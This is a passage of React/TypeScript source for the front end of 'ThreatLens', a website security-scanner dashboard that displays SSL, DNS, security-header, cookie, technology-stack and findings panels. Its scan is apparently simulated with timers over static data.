        <div className="text-xs font-bold mb-2" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>SECURITY RADAR</div>
        <ResponsiveContainer width="100%" height={250}>
          <RadarChart data={D.radar} outerRadius={88}>
            <PolarGrid stroke="rgba(6,182,212,0.07)" />
            <PolarAngleAxis dataKey="subject" tick={{ fill: "#475569", fontSize: 11, fontFamily: "'JetBrains Mono', monospace" }} />
            <Radar dataKey="value" stroke="#06b6d4" fill="#06b6d4" fillOpacity={0.1} strokeWidth={2} animationBegin={600} animationDuration={1400} dot={{ r: 3, fill: "#06b6d4", strokeWidth: 0 }} />
          </RadarChart>
        </ResponsiveContainer>
      </div>

      {/* Module cards */}
      <div>
        <div className="text-xs font-bold mb-3" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>SECURITY MODULES</div>
        <div className="grid gap-3" style={{ gridTemplateColumns: "repeat(auto-fill, minmax(210px, 1fr))" }}>
          {D.modules.map((mod, i) => {
            const visible = i < cardCount;
            const sc = { pass: "#10b981", warn: "#f59e0b", info: "#3b82f6" }[mod.status];
            const Icon = mod.Icon;
            return (
              <div key={i} onClick={() => setSection(mod.id)}
                className="tl-glass p-4 cursor-pointer"
                style={{ opacity: visible ? 1 : 0, transform: visible ? "translateY(0)" : "translateY(18px)", transition: `opacity 0.4s ease ${i * 0.055}s, transform 0.4s ease ${i * 0.055}s` }}
              >
                <div className="flex items-start justify-between mb-3">
                  <div className="p-1.5 rounded-lg" style={{ background: `${sc}12` }}>
                    <Icon size={15} style={{ color: sc }} />
                  </div>
                  <StatusBadge status={mod.status} />
                </div>
                <div className="text-sm font-semibold mb-0.5" style={{ color: "#cbd5e1", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{mod.label}</div>
                <div className="text-xs mb-3" style={{ color: "#475569", fontFamily: "'JetBrains Mono', monospace" }}>{mod.metric}</div>
                <div style={{ background: "rgba(255,255,255,0.04)", borderRadius: "999px", height: "3px", overflow: "hidden" }}>
                  <div style={{ background: `linear-gradient(90deg, ${sc}, ${sc}88)`, width: visible ? `${mod.score}%` : "0%", height: "100%", borderRadius: "999px", transition: `width 0.9s ease ${i * 0.055 + 0.3}s` }} />
                </div>
                <div className="flex justify-between mt-1.5">
                  <span className="text-xs" style={{ color: "#1e3a5f" }}>Score</span>
                  <span className="text-xs" style={{ color: sc, fontFamily: "'JetBrains Mono', monospace" }}>{mod.score}</span>
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

/* ─── SECTION: SSL ───────────────────────────────────────────────────────── */
function SSLSection() {
  const s = D.ssl;
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Lock} label="SSL / TLS Certificate" badge={{ text: s.grade, color: "#10b981" }} />
      <div className="grid gap-4" style={{ gridTemplateColumns: "auto 1fr" }}>
        {/* Grade ring */}
        <div className="tl-glass p-6 flex flex-col items-center gap-3" style={{ minWidth: "180px" }}>
          <div className="w-20 h-20 rounded-full flex items-center justify-center" style={{ background: "rgba(16,185,129,0.1)", border: "2px solid rgba(16,185,129,0.3)" }}>
            <span className="font-extrabold text-3xl" style={{ color: "#10b981", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{s.grade}</span>
          </div>
          <div className="flex items-center gap-1.5">
            <CheckCircle size={14} style={{ color: "#10b981" }} />
            <span className="text-sm" style={{ color: "#10b981" }}>Valid Certificate</span>
          </div>
          <div className="text-center">
            <div className="text-2xl font-bold" style={{ color: "#06b6d4", fontFamily: "'JetBrains Mono', monospace" }}>{s.daysLeft}</div>
            <div className="text-xs" style={{ color: "#334155" }}>days until expiry</div>
          </div>
        </div>

        {/* Details */}
        <div className="tl-glass p-5">
          <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>CERTIFICATE DETAILS</div>
          <div className="space-y-0">
            {[
              ["Issuer",       s.issuer    ],
              ["Subject",      s.subject   ],
              ["Serial",       s.serial    ],
              ["Expires",      s.expires   ],
              ["Protocol",     s.protocol  ],
              ["Cipher Suite", s.cipher    ],
              ["Key Size",     `${s.bits}-bit RSA`],
              ["CT Logging",   s.transparency ? "✓ Enabled" : "✗ Disabled"],
              ["OCSP",         s.ocsp      ],
              ["HSTS",         s.hsts ? "✓ Preloaded" : "✗ Missing"],
            ].map(([k, v]) => (
              <div key={k} className="tl-table-row flex items-center py-2.5 border-b" style={{ borderColor: "rgba(6,182,212,0.06)" }}>
                <span className="text-xs w-32 flex-shrink-0" style={{ color: "#475569" }}>{k}</span>
                <span className="text-xs font-medium flex-1 min-w-0 truncate" style={{ color: String(v).startsWith("✓") ? "#10b981" : String(v).startsWith("✗") ? "#ef4444" : "#94a3b8", fontFamily: "'JetBrains Mono', monospace" }}>{v}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

/* ─── SECTION: DNS ───────────────────────────────────────────────────────── */
function DNSSection() {
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Globe} label="DNS Records" badge={{ text: "DNSSEC ✓", color: "#10b981" }} />
      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>DNS RECORDS ({D.dns.length})</div>
        <div>
          {D.dns.map((r, i) => (
            <div key={i} className="tl-table-row flex items-center gap-4 py-3 border-b" style={{ borderColor: "rgba(6,182,212,0.06)" }}>
              <span className="text-xs font-bold px-2 py-0.5 rounded" style={{ background: "rgba(6,182,212,0.1)", color: "#06b6d4", fontFamily: "'JetBrains Mono', monospace", minWidth: "48px", textAlign: "center" }}>{r.type}</span>
              <span className="text-xs flex-1 min-w-0 truncate" style={{ color: "#94a3b8", fontFamily: "'JetBrains Mono', monospace" }}>{r.value}</span>
              <span className="text-xs" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>TTL {r.ttl}</span>
            </div>
          ))}
        </div>
      </div>
      <div className="grid gap-3" style={{ gridTemplateColumns: "1fr 1fr 1fr" }}>
        {[
          { label: "DNSSEC",  value: "Enabled",        color: "#10b981", icon: CheckCircle },
          { label: "CAA",     value: "Present",         color: "#10b981", icon: CheckCircle },
          { label: "Spoofing", value: "Protected",      color: "#10b981", icon: CheckCircle },
        ].map(({ label, value, color, icon: Icon }) => (
          <div key={label} className="tl-glass p-4 flex items-center gap-3">
            <Icon size={16} style={{ color }} />
            <div>
              <div className="text-xs font-semibold" style={{ color: "#94a3b8" }}>{label}</div>
              <div className="text-xs" style={{ color, fontFamily: "'JetBrains Mono', monospace" }}>{value}</div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ─── SECTION: HEADERS ───────────────────────────────────────────────────── */
function HeadersSection() {
  const present = D.headers.filter(h => h.present).length;
  const barData = D.headers.map(h => ({ name: h.name.replace("X-Content-Type-Options", "X-CTO").replace("Cross-Origin-Opener-Policy", "COOP").replace("Content-Security-Policy", "CSP").replace("Strict-Transport-Security", "HSTS").replace("Referrer-Policy", "Ref-Policy").replace("Permissions-Policy", "Perm-Policy").replace("X-Frame-Options", "X-Frame").replace("X-XSS-Protection", "X-XSS"), value: h.present ? 1 : 0 }));

  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Shield} label="Security Headers" badge={{ text: `${present} / ${D.headers.length}`, color: present >= 7 ? "#10b981" : "#f59e0b" }} />

      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-2" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>HEADER COMPLIANCE</div>
        <ResponsiveContainer width="100%" height={140}>
          <BarChart data={barData} barSize={24}>
            <XAxis dataKey="name" tick={{ fill: "#475569", fontSize: 9, fontFamily: "'JetBrains Mono', monospace" }} axisLine={false} tickLine={false} />
            <Bar dataKey="value" radius={[4, 4, 0, 0]}>
              {barData.map((entry, i) => (
                <Cell key={i} fill={entry.value ? "#10b981" : "#ef444455"} />
              ))}
            </Bar>
          </BarChart>
        </ResponsiveContainer>
      </div>

      <div className="tl-glass p-5">
        <div className="space-y-0">
          {D.headers.map((h, i) => (
            <div key={i} className="tl-table-row flex items-start gap-3 py-3 border-b" style={{ borderColor: "rgba(6,182,212,0.06)" }}>
              <div className="mt-0.5 flex-shrink-0">
                {h.present
                  ? <CheckCircle size={14} style={{ color: "#10b981" }} />
                  : <XCircle    size={14} style={{ color: "#ef4444" }} />}
              </div>
              <div className="flex-1 min-w-0">
                <div className="text-xs font-semibold" style={{ color: "#94a3b8", fontFamily: "'JetBrains Mono', monospace" }}>{h.name}</div>
                {h.value
                  ? <div className="text-xs mt-0.5 truncate" style={{ color: "#475569", fontFamily: "'JetBrains Mono', monospace" }}>{h.value}</div>
                  : <div className="text-xs mt-0.5" style={{ color: "#ef444488" }}>Not present</div>}
              </div>
              <span className="flex-shrink-0">
                {h.present
                  ? <span className="tl-pill text-xs" style={{ background: "#10b98112", color: "#10b981", border: "1px solid #10b98128" }}>Present</span>
                  : <span className="tl-pill text-xs tl-warn-badge" style={{ background: "#ef444412", color: "#ef4444", border: "1px solid #ef444428" }}>Missing</span>}
              </span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ─── SECTION: COOKIES ───────────────────────────────────────────────────── */
function CookiesSection() {
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Database} label="Cookie Security" badge={{ text: `${D.cookies.length} Cookies`, color: "#f59e0b" }} />
      <div className="tl-glass p-5">
        <div className="space-y-3">
          {D.cookies.map((c, i) => {
            const issues = (!c.secure ? 1 : 0) + (!c.httpOnly ? 1 : 0) + (!c.sameSite ? 1 : 0);
            const statusColor = issues === 0 ? "#10b981" : issues === 1 ? "#f59e0b" : "#ef4444";
            return (
              <div key={i} className="tl-glass p-4" style={{ background: "rgba(6,10,20,0.4)" }}>
                <div className="flex items-center justify-between mb-3">
                  <span className="text-sm font-semibold" style={{ color: "#e2e8f0", fontFamily: "'JetBrains Mono', monospace" }}>{c.name}</span>
                  <span className="text-xs" style={{ color: statusColor }}>{issues === 0 ? "Secure" : `${issues} Issue${issues > 1 ? "s" : ""}`}</span>
                </div>
                <div className="grid gap-2" style={{ gridTemplateColumns: "repeat(4, 1fr)" }}>
                  {[
                    { label: "Secure",   ok: c.secure,          value: c.secure ? "Yes" : "No" },
                    { label: "HttpOnly", ok: c.httpOnly,        value: c.httpOnly ? "Yes" : "No" },
                    { label: "SameSite", ok: !!c.sameSite,      value: c.sameSite ?? "Missing" },
                    { label: "Path",     ok: true,              value: c.path },
                  ].map(({ label, ok, value }) => (
                    <div key={label} className="text-center">
                      <div className="text-xs mb-0.5" style={{ color: "#334155" }}>{label}</div>
                      <div className="text-xs font-semibold" style={{ color: ok ? "#10b981" : "#f59e0b", fontFamily: "'JetBrains Mono', monospace" }}>{value}</div>
                    </div>
                  ))}
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

/* ─── SECTION: TECH ──────────────────────────────────────────────────────── */
function TechSection() {
  const catColors: Record<string, string> = {
    Frontend: "#06b6d4", Backend: "#3b82f6", Server: "#10b981",
    "CDN / WAF": "#f59e0b", "CI / CD": "#8b5cf6", Database: "#06b6d4",
    Cache: "#ef4444", CSS: "#a855f7", Storage: "#f59e0b",
  };
  const categories = [...new Set(D.technologies.map(t => t.category))];

  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Code} label="Technology Stack" badge={{ text: `${D.technologies.length} Detected`, color: "#06b6d4" }} />
      {categories.map(cat => (
        <div key={cat} className="tl-glass p-5">
          <div className="text-xs font-bold mb-3" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>{cat.toUpperCase()}</div>
          <div className="flex flex-wrap gap-2">
            {D.technologies.filter(t => t.category === cat).map((t, i) => {
              const color = catColors[cat] ?? "#64748b";
              return (
                <span key={i} className="tl-pill" style={{ background: `${color}12`, color, border: `1px solid ${color}28`, animationDelay: `${i * 0.07}s` }}>
                  {t.name}
                </span>
              );
            })}
          </div>
        </div>
      ))}
      <div className="tl-glass p-4 flex items-center gap-3">
        <CheckCircle size={16} style={{ color: "#10b981" }} />
        <span className="text-sm" style={{ color: "#94a3b8" }}>No known vulnerable versions detected across all technology components.</span>
      </div>
    </div>
  );
}

/* ─── SECTION: FINDINGS ──────────────────────────────────────────────────── */
function FindingsSection() {
  const warnings = D.findings.filter(f => f.severity === "warning");
  const passed   = D.findings.filter(f => f.severity === "passed");
  const info     = D.findings.filter(f => f.severity === "info");

  const CFG: Record<Severity, { color: string; Icon: React.ElementType; label: string }> = {
    warning: { color: "#f59e0b", Icon: AlertTriangle, label: "Warning" },
    passed:  { color: "#10b981", Icon: CheckCircle,   label: "Passed"  },
    info:    { color: "#3b82f6", Icon: Info,           label: "Info"    },
  };

  const all = [...warnings, ...passed, ...info];

  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={AlertTriangle} label="Risk Findings" badge={{ text: `${warnings.length} Warnings`, color: "#f59e0b" }} />
      <div className="grid gap-2" style={{ gridTemplateColumns: "repeat(3, 1fr)" }}>
        {[
          { label: "Warnings", value: warnings.length, color: "#f59e0b" },
          { label: "Passed",   value: passed.length,   color: "#10b981" },
          { label: "Info",     value: info.length,     color: "#3b82f6" },
        ].map(({ label, value, color }) => (
          <div key={label} className="tl-glass p-4 text-center">
            <div className="font-extrabold text-2xl" style={{ color, fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{value}</div>
            <div className="text-xs mt-0.5" style={{ color: "#475569" }}>{label}</div>
          </div>
        ))}
      </div>

      {/* Timeline */}
      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>FINDINGS TIMELINE</div>
        <div className="relative">
          <div className="absolute left-5 top-0 bottom-0 w-px" style={{ background: "rgba(6,182,212,0.1)" }} />
          <div className="space-y-0">
            {all.map((f, i) => {
              const cfg = CFG[f.severity];
              const Icon = cfg.Icon;
              return (
                <div key={i} className="relative flex gap-4 pb-5" style={{ animationDelay: `${i * 0.08}s` }}>
                  <div className="flex-shrink-0 relative z-10 w-10 h-10 rounded-full flex items-center justify-center" style={{ background: `${cfg.color}12`, border: `1px solid ${cfg.color}28` }}>
                    <Icon size={14} style={{ color: cfg.color }} />
                  </div>
                  <div className="flex-1 min-w-0 pt-1.5">
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-sm font-semibold" style={{ color: "#cbd5e1", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{f.title}</span>
                      <span className="tl-pill text-xs" style={{ background: `${cfg.color}12`, color: cfg.color, border: `1px solid ${cfg.color}28` }}>{cfg.label}</span>
                    </div>
                    <p className="text-xs leading-relaxed" style={{ color: "#64748b" }}>{f.desc}</p>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </div>
  );
}

/* ─── SECTION: LEARNING ──────────────────────────────────────────────────── */
function LearningSection({ expanded, setExpanded }: { expanded: number | null; setExpanded: (n: number | null) => void }) {
  const sevColor: Record<string, string> = { high: "#ef4444", medium: "#f59e0b", low: "#10b981" };

  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={BookOpen} label="Security Learning Center" />
      <p className="text-sm" style={{ color: "#64748b" }}>Deep-dive explanations for the vulnerabilities and misconfigurations detected on this target.</p>
      <div className="space-y-3">
        {D.learning.map((item, i) => {
          const open = expanded === i;
          const color = sevColor[item.severity] ?? "#64748b";
          return (
            <div key={i} className="tl-glass overflow-hidden">
              <button
                className="w-full flex items-center justify-between p-5 text-left"
                onClick={() => setExpanded(open ? null : i)}
                style={{ transition: "background 0.15s ease" }}
              >
                <div className="flex items-center gap-3">
                  <div className="w-2 h-2 rounded-full flex-shrink-0" style={{ background: color }} />
                  <span className="text-sm font-semibold" style={{ color: "#cbd5e1", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{item.title}</span>
                  <span className="tl-pill text-xs" style={{ background: `${color}12`, color, border: `1px solid ${color}28` }}>{item.severity}</span>
                </div>
                <div style={{ transform: open ? "rotate(180deg)" : "rotate(0deg)", transition: "transform 0.25s ease", color: "#475569" }}>
                  <ChevronDown size={16} />
                </div>
              </button>

              {open && (
                <div className="px-5 pb-5" style={{ animation: "tl-slide-up 0.3s ease forwards", borderTop: "1px solid rgba(6,182,212,0.08)" }}>
                  <div className="grid gap-4 pt-4" style={{ gridTemplateColumns: "1fr 1fr" }}>
                    {[
                      { label: "What is it?",       text: item.what       },
                      { label: "Why does it happen?",text: item.why        },
                      { label: "Real-world example", text: item.example    },
                      { label: "Prevention",         text: item.prevention },
                    ].map(({ label, text }) => (
                      <div key={label}>
                        <div className="text-xs font-bold mb-1.5" style={{ color: "#334155", letterSpacing: "1px", fontFamily: "'JetBrains Mono', monospace" }}>{label.toUpperCase()}</div>
                        <p className="text-xs leading-relaxed" style={{ color: "#64748b" }}>{text}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}

/* ─── SECTION HEADER ─────────────────────────────────────────────────────── */
function SectionHeader({ icon: Icon, label, badge }: { icon: React.ElementType; label: string; badge?: { text: string; color: string } }) {
  return (
    <div className="flex items-center gap-3 mb-1">
      <div className="p-2 rounded-xl" style={{ background: "rgba(6,182,212,0.1)", border: "1px solid rgba(6,182,212,0.15)" }}>
        <Icon size={18} style={{ color: "#06b6d4" }} />
      </div>
      <h2 className="font-bold text-lg" style={{ color: "#e2e8f0", fontFamily: "'Plus Jakarta Sans', sans-serif", letterSpacing: "-0.2px" }}>{label}</h2>
      {badge && (
        <span className="tl-pill text-xs" style={{ background: `${badge.color}12`, color: badge.color, border: `1px solid ${badge.color}28` }}>{badge.text}</span>
      )}
    </div>
  );
}

/* ─── RESULTS DASHBOARD ──────────────────────────────────────────────────── */
function ResultsDashboard({ target, onReset }: { target: string; onReset: () => void }) {
  const [section, setSection]           = useState<Section>("overview");
  const [sidebarOpen, setSidebarOpen]   = useState(true);
  const [score, setScore]               = useState(0);
  const [cardCount, setCardCount]       = useState(0);
  const [expandedLesson, setLesson]     = useState<number | null>(null);

  useEffect(() => {
    let cur = 0;
    const interval = setInterval(() => {
      cur += 1.8;
      if (cur >= D.score) { cur = D.score; clearInterval(interval); }
      setScore(Math.floor(cur));
    }, 18);
    for (let i = 0; i <= D.modules.length; i++) {
      setTimeout(() => setCardCount(i + 1), 180 + i * 90);
    }
    return () => clearInterval(interval);
  }, []);

  const handleSectionChange = (s: Section) => {
    setSection(s);
    if (s === "overview") {
      setCardCount(0);
      for (let i = 0; i <= D.modules.length; i++) {
        setTimeout(() => setCardCount(i + 1), 40 + i * 70);
      }
    }
  };

  const scoreColor = score >= 85 ? "#10b981" : score >= 65 ? "#06b6d4" : score >= 45 ? "#f59e0b" : "#ef4444";

  return (
    <div className="flex h-screen overflow-hidden" style={{ background: "#030712", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>
      {/* Sidebar */}
      <aside style={{
        width: sidebarOpen ? "220px" : "60px",
        transition: "width 0.25s cubic-bezier(0.4,0,0.2,1)",
        flexShrink: 0,
        display: "flex",
        flexDirection: "column",
        background: "rgba(6, 12, 26, 0.75)",
        backdropFilter: "blur(20px)",
        WebkitBackdropFilter: "blur(20px)",
        borderRight: "1px solid rgba(6,182,212,0.09)",
        overflow: "hidden",
      }}>
        {/* Sidebar header */}
        <div className="flex items-center gap-3 px-4 py-4" style={{ borderBottom: "1px solid rgba(6,182,212,0.07)", minHeight: "64px" }}>
          <div className="flex-shrink-0">
            <Shield size={19} style={{ color: "#06b6d4" }} />
          </div>
          {sidebarOpen && (
            <div className="flex-1 min-w-0">
              <div className="font-bold text-sm truncate" style={{ color: "#e2e8f0" }}>ThreatLens</div>
              <div className="text-xs" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>v2.1.0</div>
            </div>
          )}
          <button onClick={() => setSidebarOpen(!sidebarOpen)} className="flex-shrink-0 p-1 rounded-lg transition-colors hover:bg-white/5" style={{ color: "#475569" }}>
            <Menu size={15} />
          </button>
        </div>

        {/* Nav */}
        <nav className="flex-1 py-3 overflow-y-auto">
          {NAV.map(({ id, label, Icon }) => {
            const Icon2 = Icon;
            return (
              <button key={id} onClick={() => handleSectionChange(id)}
                className={`tl-nav-item w-full flex items-center gap-3 px-4 py-2.5 text-left ${section === id ? "tl-nav-active" : ""}`}
                style={{ color: section === id ? "#06b6d4" : "#64748b", fontSize: "13px", background: "none", border: "none", cursor: "pointer", fontFamily: "'Inter', sans-serif", fontWeight: 500 }}
              >
                <Icon2 size={15} style={{ flexShrink: 0 }} />
                {sidebarOpen && <span className="truncate">{label}</span>}
              </button>
            );
          })}
        </nav>

        {/* Sidebar footer */}
        <div className="px-3 py-3" style={{ borderTop: "1px solid rgba(6,182,212,0.07)" }}>
          <button onClick={onReset} className="tl-nav-item w-full flex items-center gap-3 py-2 px-1 rounded-lg" style={{ color: "#334155", fontSize: "12px", background: "none", border: "none", cursor: "pointer", fontFamily: "'Inter', sans-serif" }}>
            <RefreshCw size={14} style={{ flexShrink: 0 }} />
            {sidebarOpen && <span>New Analysis</span>}
          </button>
        </div>
      </aside>

      {/* Main */}
      <main className="flex-1 flex flex-col overflow-hidden">
        {/* Top bar */}
        <header className="flex items-center justify-between px-6 py-4 flex-shrink-0" style={{ borderBottom: "1px solid rgba(6,182,212,0.07)", background: "rgba(6,12,26,0.55)", backdropFilter: "blur(12px)" }}>
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-xs" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>Target</span>
              <span className="text-sm font-semibold" style={{ color: "#06b6d4", fontFamily: "'JetBrains Mono', monospace" }}>{target}</span>
              <span className="tl-pill text-xs" style={{ background: "#10b98112", color: "#10b981", border: "1px solid #10b98128" }}>{D.grade} · {D.risk}</span>
            </div>
            <div className="text-xs mt-0.5" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>
              {new Date().toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" })} · {D.confidence}
            </div>
          </div>
          <div className="flex items-center gap-4">
            <div className="text-right">
              <div className="font-extrabold text-2xl" style={{ color: scoreColor, lineHeight: 1, fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{score}</div>
              <div className="text-xs" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>Risk Score</div>
            </div>
            <div className="w-px h-8" style={{ background: "rgba(6,182,212,0.1)" }} />
            <button onClick={onReset} className="flex items-center gap-1.5 text-xs px-3 py-2 rounded-lg transition-all duration-150 hover:bg-white/5" style={{ color: "#475569", border: "1px solid rgba(255,255,255,0.06)", cursor: "pointer", background: "none", fontFamily: "'Inter', sans-serif" }}>
              <RefreshCw size={12} />
              New Scan
            </button>
          </div>
        </header>

        {/* Content */}
        <div className="flex-1 overflow-y-auto px-6 py-6">
          {section === "overview"  && <OverviewSection  score={score} cardCount={cardCount} setSection={handleSectionChange} />}
          {section === "ssl"       && <SSLSection />}
          {section === "dns"       && <DNSSection />}
          {section === "headers"   && <HeadersSection />}
          {section === "cookies"   && <CookiesSection />}
          {section === "tech"      && <TechSection />}
          {section === "findings"  && <FindingsSection />}
          {section === "learning"  && <LearningSection expanded={expandedLesson} setExpanded={setLesson} />}
        </div>
      </main>
    </div>
  );
}

/* ─── APP ────────────────────────────────────────────────────────────────── */
export default function App() {
  const [phase,    setPhase]    = useState<Phase>("hero");
  const [target,   setTarget]   = useState("");
  const [scanStep, setScanStep] = useState(-1);
  const [scanResult, setScanResult] = useState<any>(null);
  const handleAnalyze = (t: string) => {
    setTarget(t);
    setScanStep(-1);
    setPhase("scanning");
  };

  useEffect(() => {
    if (phase !== "scanning") return;
    const ids: ReturnType<typeof setTimeout>[] = [];
    let elapsed = 350;
    SCAN_STEPS.forEach((s, i) => {
      ids.push(setTimeout(() => setScanStep(i), elapsed));
      elapsed += s.duration;
    });
    ids.push(setTimeout(() => {
      setScanStep(SCAN_STEPS.length);
      ids.push(setTimeout(() => setPhase("results"), 700));
    }, elapsed));
    return () => ids.forEach(clearTimeout);
  }, [phase]);

  return (
    <div className="dark" style={{ minHeight: "100vh" }}>
      <style>{STYLES}</style>
      {phase === "hero"     && <HeroPage onAnalyze={handleAnalyze} />}
      {phase === "scanning" && <ScanTerminal target={target} step={scanStep} />}
      {phase === "results"  && <ResultsDashboard target={target} onReset={() => setPhase("hero")} />}
    </div>
  );
}
